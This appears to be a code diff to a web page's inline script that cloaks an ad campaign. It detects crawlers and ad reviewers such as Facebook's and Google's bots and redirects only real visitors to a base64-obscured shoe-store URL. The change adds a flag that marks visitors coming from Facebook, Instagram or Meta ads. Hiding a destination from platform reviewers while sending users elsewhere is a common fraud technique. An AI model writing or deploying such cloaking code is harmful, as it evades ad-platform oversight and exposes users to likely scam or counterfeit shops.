@@ -7,7 +7,10 @@
       var bots = ['facebookexternalhit','facebot','facebookbot','meta-externalagent','meta-crawler','adsbot','googlebot','bingbot','twitterbot','linkedinbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','ia_archiver'];
       var isBot = bots.some(function(b){ return ua.indexOf(b) !== -1; });
       if (!isBot) {
-        window.location.replace(atob('aHR0cHM6Ly9sb2phLWNhdGVycGlsbGFyLmNvbS9wcm9kdXRvcy90ZW5pcy1mb3JjZS1vbmU='));
+        var dest = atob('aHR0cHM6Ly9sb2phLWNhdGVycGlsbGFyLmNvbS9wcm9kdXRvcy90ZW5pcy1mb3JjZS1vbmU=');
+        var p = new URLSearchParams(window.location.search);
+        var fromAd = p.get('fbclid') || (p.get('utm_source') || '').match(/facebook|instagram|meta/i);
+        window.location.replace(dest + (fromAd ? '?_s=1' : ''));
       }
     })();
   </script>
